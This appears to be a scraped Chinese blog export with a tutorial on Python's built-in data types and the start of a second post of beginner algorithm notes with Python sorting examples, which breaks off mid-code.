1234int（有符号整型）long（长整型[也可以代表八进制和十六进制]）float（浮点型）complex（复数） a. int（整型） 在32位机器上，整数的位数为32位，取值范围为-231～231-1，即-2147483648～2147483647 在64位系统上，整数的位数为64位，取值范围为-263～263-1，即-9223372036854775808～9223372036854775807 b. long（长整型） 跟C语言不同，Python的长整数没有指定位宽，即：Python没有限制长整数数值的大小，但实际上由于机器内存有限，长整数数值不可能无限大。 注意，自从Python2.2起，如果整数发生溢出，Python会自动将整数数据转换为长整数，所以如今在长整数数据后面不加字母L也不会导致严重后果了。 c. float（浮点型） 浮点数用来处理实数，即带有小数的数字。类似于C语言中的double类型，占8个字节（64位），其中52位表示底，11位表示指数，剩下的一位表示符号。d. complex（复数） 复数由实数部分和虚数部分组成，一般形式为x＋yj，其中的x是复数的实数部分，y是复数虚数部分，这里的x和y都是实数。 注：Python中存在小数字池：-5 ～ 257 小整数对象——小整型对象池在实际编程中，数值比较小的整数，比如1,2,29等，可能会非常频繁的出现。而在python中，所有的对象都存在于系统堆上。想想？如果某个小整数出现的次数非常多，那么Python将会出现大量的malloc/free操作，这样大大降低了运行效率，而且会造成大量的内存碎片，严重影响Python的整体性能。在python2.7乃至3.3中,将小整数位于[-5,257)之间的数，缓存在小整型对象池中。0x1.4数字类型转换有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。 1234int(x) 将x转换为一个整数。float(x) 将x转换到一个浮点数。complex(x) 将x转换到一个复数，实数部分为 x，虚数部分为 0。complex(x, y) 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。 x 和 y 是数字表达式 以下实例将浮点数变量 a 转换为整数： 123&gt;&gt;&gt; a = 1.0&gt;&gt;&gt; int(a)1 0x1.5数字运算 在整数除法中，除法 / 总是返回一个浮点数，如果只想得到整数的结果，丢弃可能的分数部分，可以使用运算符 // 12345&gt;&gt;&gt; 17 / 3 # 整数除法返回浮点型5.666666666666667&gt;&gt;&gt;&gt;&gt;&gt; 17 // 3 # 整数除法返回向下取整后的结果5 //得到的并不一定是整数类型的数，它与分母分子的数据类型有关系。 1234&gt;&gt;&gt; 7//23&gt;&gt;&gt; 7.0//23.0 可以使用 ** 操作来进行幂运算 1234&gt;&gt;&gt; 5 ** 2 # 5 的平方25&gt;&gt;&gt; 2 ** 7 # 2的7次方128 不同类型的数混合运算时会将整数转换为浮点数： 1234&gt;&gt;&gt; 3 * 3.75 / 1.57.5&gt;&gt;&gt; 7.0 / 23.5 在交互模式中，最后被输出的表达式结果被赋值给变量 _ 12345678&gt;&gt;&gt; tax = 12.5 / 100&gt;&gt;&gt; price = 100.50&gt;&gt;&gt; price * tax12.5625&gt;&gt;&gt; price + _113.0625&gt;&gt;&gt; round(_, 2)113.06 0x1.6数学函数 123456789101112abs(x) 返回数字的绝对值，如abs(-10) 返回 10ceil(x) 返回数字的上入整数，如math.ceil(4.1) 返回 5exp(x) 返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045fabs(x) 返回数字的绝对值，如math.fabs(-10) 返回10.0floor(x) 返回数字的下舍整数，如math.floor(4.9)返回 4log(x) 如math.log(math.e)返回1.0,math.log(100,10)返回2.0log10(x) 返回以10为基数的x的对数，如math.log10(100)返回 2.0max(x1, x2,...) 返回给定参数的最大值，参数可以为序列。min(x1, x2,...) 返回给定参数的最小值，参数可以为序列。modf(x) 返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。pow(x, y) x**y 运算后的值。round(x [,n]) 返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。 0x2String（字符串）0x2.1字符串的用处它是编程语言中表示文本的数据类型。0x2.2字符串组成及截取字符串或串(String)是由数字、字母、下划线组成的一串字符我们可以使用引号( ‘ 或 “ )来创建字符串Python的字串列表有2种取值顺序: 12从左到右索引默认0开始的，最大范围是字符串长度少1 从右到左索引默认-1开始的，最大范围是字符串开头 如果你要实现从字符串中获取一段子字符串的话，可以使用变量 [头下标:尾下标]，就可以截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。 比如: 1s = 'i love python' s[2:6]的结果是love。（顾头不顾尾，或左闭右开）0x2.3转义字符 1234567891011121314\\\\ 反斜杠符号\\' 单引号\\\" 双引号\\a 响铃\\b 退格(Backspace)\\000 空\\n 换行\\v 纵向制表符\\t 横向制表符\\r 回车\\f 换页\\oyy 八进制数，yy代表的字符，例如：\\o12代表换行\\xyy 十六进制数，yy代表的字符，例如：\\x0a代表换行\\other 其它的字符以普通格式输出 0x2.4运算符 123456789+ 字符串连接 * 重复输出字符串 [] 通过索引获取字符串中字符 [ : ] 截取字符串中的一部分，遵循左闭右开原则，str[0:2] 是不包含第 3 个字符的。 in 成员运算符 - 如果字符串中包含给定的字符返回 True not in 成员运算符 - 如果字符串中不包含给定的字符返回 True r/R 原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母 r（可以大小写）以外，与普通字符串有着几乎完全相同的语法。 % 格式字符串 0x2.5字符串格式化Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。 在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。python字符串格式化符号: 12345678910111213%c 格式化字符及其ASCII码%s 格式化字符串%d 格式化整数%u 格式化无符号整型%o 格式化无符号八进制数%x 格式化无符号十六进制数%X 格式化无符号十六进制数（大写）%f 格式化浮点数字，可指定小数点后的精度%e 用科学计数法格式化浮点数%E 作用同%e，用科学计数法格式化浮点数%g %f和%e的简写%G %f 和 %E 的简写%p 用十六进制数格式化变量的地址 格式化操作符辅助指令: 123456789* 定义宽度或者小数点精度- 用做左对齐+ 在正数前面显示加号( + )&lt;sp&gt; 在正数前面显示空格# 在八进制数前面显示零('0')，在十六进制前面显示'0x'或者'0X'(取决于用的是'x'还是'X')0 显示的数字前面填充'0'而不是默认的空格% '%%'输出一个单一的'%'(var) 映射变量(字典参数)m.n. m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话) Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能基本语法是通过 {} 和 : 来代替以前的 % 。 format 函数可以接受不限个参数，位置可以不按顺序。 12345678&gt;&gt;&gt;\"&#123;&#125; &#123;&#125;\".format(\"hello\", \"world\") # 不设置指定位置，按默认顺序'hello world' &gt;&gt;&gt; \"&#123;0&#125; &#123;1&#125;\".format(\"hello\", \"world\") # 设置指定位置'hello world' &gt;&gt;&gt; \"&#123;1&#125; &#123;0&#125; &#123;1&#125;\".format(\"hello\", \"world\") # 设置指定位置'world hello world' 也可以设置参数： 123456789print(\"网站名：&#123;name&#125;, 地址 &#123;url&#125;\".format(name=\"菜鸟教程\", url=\"www.runoob.com\")) # 通过字典设置参数site = &#123;\"name\": \"菜鸟教程\", \"url\": \"www.runoob.com\"&#125;print(\"网站名：&#123;name&#125;, 地址 &#123;url&#125;\".format(**site)) # 通过列表索引设置参数my_list = ['菜鸟教程', 'www.runoob.com']print(\"网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;\".format(my_list)) # \"0\" 是必须的 也可以向 str.format() 传入对象： 12345class AssignValue(object): def __init__(self, value): self.value = valuemy_value = AssignValue(6)print('value 为: &#123;0.value&#125;'.format(my_value)) # \"0\" 是可选的,可去掉。 下表展示了 str.format() 格式化数字的多种方法： 12&gt;&gt;&gt; print(\"&#123;:.2f&#125;\".format(3.1415926));3.14 此外我们可以使用大括号 {} 来转义大括号，如下实例： 1print (\"&#123;&#125; 对应的位置是 &#123;&#123;0&#125;&#125;\".format(\"runoob\")) 0x2.6三引号 123456para_str = \"\"\"这是一个多行字符串的实例多行字符串可以使用制表符TAB ( \\t )。也可以使用换行符 [ \\n ]。\"\"\"print (para_str) 0x2.7Unicode 字符串在Python2中，普通字符串是以8位ASCII码进行存储的，而Unicode字符串则存储为16位unicode字符串，这样能够表示更多的字符集。使用的语法是在字符串前面加上前缀 u。在Python3中，所有的字符串都是Unicode字符串0x2.8字符串内建函数 方法 描述 capitalize() 将字符串的第一个字符转换为大写 center(width, fillchar) 返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。 count(str, beg= 0,end=len(string)) 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数 bytes.decode(encoding=”utf-8”, errors=”strict”) Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。 encode(encoding=’UTF-8’,errors=’strict’) 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’ endswith(suffix, beg=0, end=len(string)) 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False. startswith(substr, beg=0,end=len(string)) 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。 expandtabs(tabsize=8) 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。 find(str, beg=0, end=len(string)) 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1 isalnum() 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True,否则返回 False isalpha() 如果字符串至少有一个字符并且所有字符都是字母则返回 True, 否则返回 False isdigit() 如果字符串只包含数字则返回 True 否则返回 False.. islower() 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False isnumeric() 如果字符串中只包含数字字符，则返回 True，否则返回 False isspace() 如果字符串中只包含空白，则返回 True，否则返回 False. join(seq) 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串 len(string) 返回字符串长度 ljust(width[, fillchar]) 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。 lower() 转换字符串中所有大写字符为小写. lstrip() 截掉字符串左边的空格或指定字符。 maketrans() 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 max(str) 返回字符串 str 中最大的字母。 min(str) 返回字符串 str 中最小的字母。 replace(old, new [, max]) 把 将字符串中的 str1 替换成 str2,如果 max 指定，则替换不超过 max 次。 rfind(str, beg=0,end=len(string)) 类似于 find()函数，不过是从右边开始查找. rstrip() 删除字符串字符串末尾的空格. split(str=””, num=string.count(str)) num=string.count(str)) 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串 splitlines([keepends]) 按照行(‘\\r’, ‘\\r\\n’, \\n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。 startswith(substr, beg=0,end=len(string)) 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。 strip([chars]) 在字符串上执行 lstrip()和 rstrip() swapcase() 将字符串中大写转换为小写，小写转换为大写 translate(table, deletechars=””) 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中 upper() 转换字符串中的小写字母为大写 zfill (width) 返回长度为 width 的字符串，原字符串右对齐，前面填充0 isdecimal() 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。 # 0x3Tuple（元组） 元组是另一个数据类型，类似于List（列表）。元组用”()”标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表。操作实例与列表相似 0x3.1元组的应用场景 尽管可以使用for in 遍历元祖，但是在开发中，更多的应用场景是： 1231.函数的参数和返回值，一个函数可以接受任意多个参数，或者依次返回多个数据2.格式化字符串，格式化字符串后面的（）本质上就是一个元祖；3.让列表不可以修改，以保护数据安全 0x3.2元组的创建创建空元组 1tup1 = (); 元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用： 1234567&gt;&gt;&gt;tup1 = (50)&gt;&gt;&gt; type(tup1) # 不加逗号，类型为整型&lt;class 'int'&gt; &gt;&gt;&gt; tup1 = (50,)&gt;&gt;&gt; type(tup1) # 加上逗号，类型为元组&lt;class 'tuple'&gt; 0x3.3访问元组 元组可以使用下标索引来访问元组中的值，如下实例: 1234tup1 = ('Google', 'Runoob', 1997, 2000)tup2 = (1, 2, 3, 4, 5, 6, 7 )print (\"tup1[0]: \", tup1[0])print (\"tup2[1:5]: \", tup2[1:5]) 0x3.4修改元组元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，如下实例: 1234567tup1 = (12, 34.56);tup2 = ('abc', 'xyz') # 以下修改元组元素操作是非法的。# tup1[0] = 100# 创建一个新的元组tup3 = tup1 + tup2;print (tup3) 0x3.5删除元组元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组，如下实例: 12345tup = ('Google', 'Runoob', 1997, 2000)print (tup)del tup;print (\"删除后的元组 tup : \")print (tup) 0x3.6元组运算符与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。 0x3.7元素索引截取因为元组也是一个序列，所以我们可以访问元组中的指定位置的元素，也可以截取索引中的一段元素0x3.8元组内置函数 方法 描述 len(tuple) 计算元组元素个数 max(tuple) 返回元组中元素最大值 min(tuple) 返回元组中元素最小值 tuple(seq) 将列表转换为元组 0x4List（列表）List（列表） 是 Python 中使用最频繁的数据类型。 列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（所谓嵌套）。 0x4.1列表的应用场景尽管python 中的列表可以存储不同类型的数据，但是在开发中，更多的应用场景是： 121.列表存储相同类型的数据2.通过迭代遍历，在循环体内部，针对列表中的每一项元素，执行相同的操作。 0x4.2创建列表创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可0x4.3访问类表使用下标索引来访问列表中的值，同样你也可以使用方括号的形式截取字符0x4.4更新列表你可以对列表的数据项进行修改或更新，你也可以使用append()方法来添加列表项，如下所示 1234list = ['Google', 'Runoob', 1997, 2000]print (\"第三个元素为 : \", list[2])list[2] = 2001print (\"更新后的第三个元素为 : \", list[2]) 0x4.5删除列表元素可以使用 del 语句来删除列表的的元素 或remove()方法 1234list = ['Google', 'Runoob', 1997, 2000] print (\"原始列表 : \", list)del list[2]print (\"删除第三个元素 : \", list) 0x4.6列表脚本操作符列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表0x4.7列表函数 方法 描述 len(tuple) 计算元组元素个数 max(tuple) 返回元组中元素最大值 min(tuple) 返回元组中元素最小值 list(seq) 将元组转换为列表 0x4.8列表方法 描述 方法 list.append(obj) 在列表末尾添加新的对象 list.count(obj) 统计某个元素在列表中出现的次数 list.extend(seq) 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表） list.index(obj) 从列表中找出某个值第一个匹配项的索引位置 list.insert(index, obj) 将对象插入列表 list.pop([index=-1]) 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值 list.remove(obj) 移除列表中某个值的第一个匹配项 list.reverse() 反向列表中元素 list.sort( key=None, reverse=False) 对原列表进行排序 list.clear() 清空列表 list.copy() 复制列表 0x5Dictionary（字典）字典(dictionary)是除列表以外Python之中最灵活的内置数据结构类型。列表是有序的对象结合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。字典用”{ }”标识。字典由索引(key)和它对应的值value组成。0x5.1字典的应用场景 121.使用多个键值对，存储描述一个物体的相关信息–描述更复杂的数据信息2.将多个字典放在一个列表中，再进行遍历，再循环体内针对每一个字典进行相同的处理 0x5.2访问字典里的值把相应的键放入到方括号中 12dict = &#123;'Name': 'Runoob', 'Age': 7, 'Class': 'First'&#125;print (\"dict['Name']: \", dict['Name']) 0x5.3修改字典向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对如下实例: 123dict = &#123;'Name': 'Runoob', 'Age': 7, 'Class': 'First'&#125;dict['Age'] = 8 # 更新 Agedict['School'] = \"菜鸟教程\" # 添加信息 0x5.4删除字典元素能删单一的元素也能清空字典，清空只需一项操作。显示删除一个字典用del命令，如下实例： 1234dict = &#123;'Name': 'Runoob', 'Age': 7, 'Class': 'First'&#125;del dict['Name'] # 删除键 'Name'dict.clear() # 清空字典del dict # 删除字典 0x5.5字典键的特性字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行。两个重要的点需要记住：1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行0x5.5字典的内置函数 方法 描述 len(dict) 计算字典元素个数，即键的总数。 str(dict) 输出字典，以可打印的字符串表示。 type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。 0x5.6字典的方法 方法 描述 radiansdict.clear() 删除字典内所有元素 radiansdict.copy() 返回一个字典的浅复制 radiansdict.fromkeys() 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值 radiansdict.get(key, default=None) 返回指定键的值，如果值不在字典中返回default值 key in dict 如果键在字典dict里返回true，否则返回false radiansdict.items() 以列表返回可遍历的(键, 值) 元组数组 radiansdict.keys() 返回一个迭代器，可以使用 list() 来转换为列表 radiansdict.setdefault(key, default=None) 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default radiansdict.update(dict2) 把字典dict2的键/值对更新到dict里 radiansdict.values() 返回一个迭代器，可以使用 list() 来转换为列表 pop(key[,default]) 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。 popitem() 随机返回并删除字典中的一对键和值(一般删除末尾对)。 0x6Set（集合）集合（set）是一个无序的不重复元素序列。set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key和list比较，dict有以下几个特点： 12查找和插入的速度极快，不会随着key的增加而变慢；需要占用大量的内存，内存浪费多。 而list相反： 12查找和插入的时间随着元素的增加而增加；占用空间小，浪费内存很少。 0x6.1集合的创建可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。0x6.2添加元素语法格式如下： 1s.add( x ) 将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。还有一个方法，也可以添加元素，且参数可以是列表，元组，字典等 1s.update( x ) x 可以有多个，用逗号分开。 12345678&gt;&gt;&gt;thisset = set((\"Google\", \"Runoob\", \"Taobao\"))&gt;&gt;&gt; thisset.update(&#123;1,3&#125;)&gt;&gt;&gt; print(thisset)&#123;1, 3, 'Google', 'Taobao', 'Runoob'&#125;&gt;&gt;&gt; thisset.update([1,4],[5,6]) &gt;&gt;&gt; print(thisset)&#123;1, 3, 4, 5, 6, 'Google', 'Taobao', 'Runoob'&#125;&gt;&gt;&gt; 0x6.3移除元素 123s.remove( x ) #元素不存在报错s.discard( x ) #元素不存在不会报错 s.pop() # 随机删除 0x6.4内置函数 方法 描述 add() 为集合添加元素 clear() 移除集合中的所有元素 copy() 拷贝一个集合 difference() 返回多个集合的差集 difference_update() 移除集合中的元素，该元素在指定的集合也存在。 discard() 删除集合中指定的元素 intersection() 返回集合的交集 intersection_update() 删除集合中的元素，该元素在指定的集合中不存在。 isdisjoint() 判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。 issubset() 判断指定集合是否为该方法参数集合的子集。 issuperset() 判断该方法的参数集合是否为指定集合的子集 pop() 随机移除元素 remove() 移除指定元素 symmetric_difference() 返回两个集合中不重复的元素集合。 symmetric_difference_update() 移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。 union() 返回两个集合的并集 update() 给集合添加元素 参考文章:菜鸟教程https://www.runoob.com/python3/python3-data-type.html 廖雪峰的官方网站https://www.liaoxuefeng.com/wiki/1016959663602400/1017104324028448python基础之五大标准数据类型https://www.cnblogs.com/snaildev/p/7544558.html","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"常见数据类型","slug":"常见数据类型","permalink":"https://blog.cfyqy.com/tags/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"}],"author":"ye1s"},{"title":"图解算法使用python笔记","slug":"算法使用python","date":"2019-05-23T14:07:00.000Z","updated":"2021-01-05T03:12:09.590Z","comments":true,"path":"article/81e351e9.html","link":"","permalink":"https://blog.cfyqy.com/article/81e351e9.html","excerpt":"比较简略的算法书，适合初学者入门。 以下是做的一些简记。","text":"比较简略的算法书，适合初学者入门。 以下是做的一些简记。 0x1算法0x1.1算法的定义为了解决某项工作或某个问题,所需要有限数量的机械性或重复性指令与计算步骤。这个算法应用相当广泛，如快排序法、递归算法、大整数乘法。 1234567num1=int(input('输入第一个数:'))num2=int(input('输入第二个数:'))while num2!=0: temp=num1%num2 num1=num2 num2=tempprint('最大公约数:',num1) 0x1.2算法条件输入、输出、明确性、有限性、有效性0x1.3时间复杂度O(f(n)) 10(1)&lt;0(log2n)&lt;0(n)&lt;O(nlog2n)&lt;O(n2)&lt;O(2n) 0x2常见算法0x2.1分治法核心思想就是将一个难以直接解决的大问题依照相同的概念,分割长两个或更多子问题，以便各个击破，即“分而治之”。0x2.2递归法定义: 一个函数或子程序，是由自身所定义或调用的，就成为递归。至少满足的两个条件:一个可以反复执行的递归过程一个可以离开递归执行过程的出口范例:阶乘函数 123456def factorial(i): if i==0: return 1 else: ans=i*factorial(i-1) return ans 斐波那契数列 1234567def fib(n): if n==0: return 0 elif n==1 or n==2: return 1 else: return (fib(n-1)+fib(n-2)) 0x2.3 贪心算法方法是从某一七点开始，在每一个解决问题步骤中使用贪心原则，即采用在当前状态下最有利或最优化选择，不断地改进该解答，持续在每一步骤中选择最佳的方法，并且逐步逼近给定的目标，当达到某一步骤不能再继续前进时，算法就停止，就是尽可能快地求得更好的解。经常用于找出图的最小生成树，最短路径与哈弗曼编码等。0x2.4动态规划法主要做法:如果一个问题答案与子问题相关的话，就能将大问题拆解成各个小问题，其中与分治法最大不同的地方是可以让每一个子问题的答案被存储起来，以供下次求解时直接取用。这样的做法不但能减少再次计算的时间，并将这些解组合成大问题的解答，故而使用动态规划可以解决重复计算问题。范例:斐波那契数列 123456789101112output=[None]*1000def Fibonacci(n): result=output[n] if result==None: if n==0: result=0 elif n==1: result=1 else: result=Fibonacci(n-1) + Fibonacci(n-2) output[n]=result return result 0x2.5迭代法是指无法使用公式一次求解，而需要使用迭代，例如用循环去重复执行程序代码的某些部分来得到答案。范例:使用for循环来设计一个计算1!~n!阶乘的递归程序 1234567sum=1n=int(input('请输入n='))for i in range(0,n+1): for j in range(i,0,-1): sum *=j print('%d!=%3d'%(i,sum)) sum=1 0x2.6枚举法又称穷举法，核心思想就是列举所有的可能。范例:当某数1000依次减去1,2,3……直到哪一个数，相减得结果开始为负数。 123456x=1num=1000while num&gt;=0: num=num-x x=x+1print(x-1) 0x2.7回溯法也算是枚举中的一种。特点主要是在搜索过程中寻找问题的解，当发现不满足求解条件时，就回溯，尝试别的路径，避免无效搜索。常见的迷宫问题 0x3数据结构类型0x3.1数组数组结构其实就是一排紧密相邻的可数内存，并提供一个能够直接访问单一数据内容的计算方法。 0x3.2链表是由许多相同数据项按特定顺序排列而成的线性表。 0x3.3 堆栈是一组相同数据类型的组合，具有后进先出的特性，所有操作均在堆栈结构的顶端进行。 0x3.4队列是一种先进先出的数据结构，和堆栈一样都是一种有序线性表的抽象数据类型。 0x3.5树形结构基本观念:树是由一个或一个以上的节点所组成的，存在一个特殊的节点，称为树根，每个节点可代表一些数据和指针组合而成的记录。一些专有名词:度数:每个节点所有子树的个数层数:树的层数高度: 树的最大层数树叶或终端节点: 度数为零节点就是树叶父节点:每个节点有连接的上一层节点子节点:每个节点有连接的下一层节点祖先和子孙:所谓祖先，是指从树根到该节点路径上所包含的几点，而子孙则是在该节点往下追溯子树中的任意节点兄弟节点:有共同父亲节点的节点为兄弟节点非终端节点:树叶以外的节点同代: 在同一棵中具有相同层数的节点森林:n棵(n&gt;=0)互斥树的集合二叉树:一般树形结构在计算机内存中的存储方式是以链表为主 0x3.6图形结构图是由定点和边组成的集合,通常用G=(V,E)来表示，其中V是所有顶点所组成的集合，而E代表所有边所组成的集合。 图的种类有两种;一种是无向图，一种是有向图，无向图以(V1,V2)表示其边，有向图以&lt;V1,V2&gt;表示其边。 0x3.7哈希表哈希表是一种存储记录的连续内存，通过哈希函数的应用，可以快速存取与查找数据。相关名词bucket（桶): 哈希表总存储数据的位置，每一个位置对应到唯一的一个地址，桶就好比一个记录。solt(槽):每个记录中可能包含好几个字段，而solt就是桶中的字段。collision(碰撞): 两项不同的数据，经过哈希函数运算后，对应到相同的地址。溢出:如果数据经过哈希函数运算后，所对应的bucket已满，就会使bucket发生溢出。哈希表: 存储记录的连续内存。同义词:两个标识符I1和I2经哈希函数运算后所得的数值相同。加载密度: 是指标识符的使用数量除以哈希表内槽的总数。完美哈希: 没有碰撞也没有溢出的哈希函数。 0x4排序算法在排序过程中，根据数据的移动方式，可将排序方式分为：直接移动和逻辑移动两种方式。直接移动：是指直接交换存储数据的位置；缺点是：直接移动会浪费许多时间进行数据的移动。而逻辑移动并不会移动数据存储的位置，仅仅改变指向这些数据的辅助功能指针的值；优点是：只要改变辅助指针指向的位置就能达到排序的目的。 排序可以按照执行时所使用的内存种类区分为以下两种方式：1）内部排序：排序数量小，可以全部加载到内存中进行排序。2）外部排序：数据量大，无法全部一次性加载到内存中进行排序，而必须借助辅助存储器(如硬盘)进行排序。 排序算法的分析1）算法稳定与否？稳定的排序是指在经过排序后，两个相同键值的记录仍然保持原来的次序。即同一数字在排序前后的相对位置不会发生改变。 2）时间复杂度？Time Complexity当数据量较大时，排序算法所花费的时间就显得尤为重要。排序算法的时间复杂度分为:最好情况(Best Case)、平均情况（Average Case）和最差情况（Worst Case）.最好情况就是值原本的数列已经是经过排序之后的结果；最差结果是数列中的每一个值都需要重新排列。3）空间复杂度？Space Complexity空间复杂度是指算法在执行过程中所需要占用的额外内存空间。任何排序算法都有数据的对调操作，数据对调就会暂时用到一个额外的空间，这也是排序中空间复杂度要考虑的问题。排序算法占用的额外空间越小，空间复杂度就越低 0x4.1冒泡排序法原理:是从第一个元素开始比较相邻元素的大小，若大小顺序有误，则对调后再进行下一个元素的比较，就仿佛气泡逐渐从水底逐渐冒升到水面上一样。如此扫面一次之后，就可以确保最后一个元素位于正确的顺序。接着再逐步进行第二次扫描，直到完成所有元素的排序关系为止。范例: 1234567891011121314151617data=[16,25,39,27,12,8,45,63]print('冒泡排序法:原始数据为:')for i in range(len(data)): print('%3d'%data[i],end='')print()for i in range(len(data)-1,0,-1): #扫描次数 for j in range(i): if data[j]&gt;data[j+1]: data[j],data[j+1]=data[j+1],data[j] print('第%d次排序后的结果是:'%(8-i),end='') for j in range(len(data)): print('%3d'%data[j],end='') print()print('排序后的结果为:')for j in range(len(data)): print('%3d'%data[j],end='')print() 0x4.2选择排序法也算是枚举法的一种应用，就是反复从未排序的数列中取出最小的元素，加入到另一个数列中，最后的结果即为已排序的数列。范例: 12345678910111213141516def showdata(data): for i in range(len(data)): print('%3d'%data[i],end='') print()def select(data): for i in range(len(data)-1): for j in range(i+1,8): if data[i]&gt;data[j]: data[i],data[j]=data[j],data[i] print()data=[16,25,39,27,12,8,45,63]print('原始数据为:')showdata(data)select(data)print('排序后的数据为:')showdata(data) 0x4.3插入排序法是将数组中的元素，逐一与已排序好的数据进行比较，前两个元素先排好，再将第三个元素插入适当的位置，所以这三个元素仍然是已排序好的，接着讲第四个元素加入，重复此步骤，直到排序完成为止。 1234567891011121314151617181920def showdata(data): for i in range(len(data)): print('%3d'%data[i],end='') print()def insert(data): for i in range(1,len(data)): tmp=data[i]#tmp用来暂存数据 no=i-1 while no &gt;=0 and tmp &lt;data[no]: data[no+1]=data[no] #就把所有元素往后推一个元素 no-=1 data[no+1]=tmp #最小的元素放到第一个位置def main(): data = [16, 25, 39, 27, 12, 8, 45, 63] print('原始数据为:') showdata(data) insert(data) print('排序后的数据为:') showdata(data)main() 0x4.4希尔排序排序的原则是将数据区分成特定间隔的几个小区块，以插入排序法排完区块内的数据后再渐渐减少间隔的距离。 123456789101112131415161718192021222324252627def showdata(data): for i in range(len(data)): print('%3d' % data[i], end='') print()def shell(data): k = 1 # 打印计数 j=0 jmp = len(data) // 2 while jmp &gt;= 1: for i in range(jmp, len(data)): tmp = data[i] j = i - jmp while j &gt;= 0 and tmp &lt; data[j]: data[j + jmp] = data[j] j = j - jmp data[jmp + j] = tmp print('第%d次排序过程:' % k, end='') k += 1 showdata(data) print('--------------------------------') jmp = jmp // 2def main(): data = [16, 25, 39, 27, 12, 8, 45, 63] print('原始数据为:') showdata(data) shell(data)main() 0x4.5合并排序法工作原理针对已排序好的两个或两个以上的数列通过合并的方式，将其组合成一个大的且已排序好序的数列。 1234567891011121314151617181920212223242526272829303132333435363738list3 = []list1 = [20, 45, 51, 88, 99999]list2 = [98, 10, 23, 15, 99999]def select_sort(data): #选择排序法 for i in range(len(data)-1): small=i for j in range(i+1,len(data)-1): if data[j]&lt;data[small]: small=j data[small],data[i]=data[i],data[small]def Merge(list1,list2): index1=0 index2=0 for index3 in range(len(list1)+len(list2)-1): if list1[index1]&lt;list2[index2]: list3.append(list1[index1]) index1 +=1 print('此数字%d来自于第1个数列'%list3[index3]) else: list3.append(list2[index2]) index2 +=1 print('此数字%d来自于第2个数列'%list3[index3]) 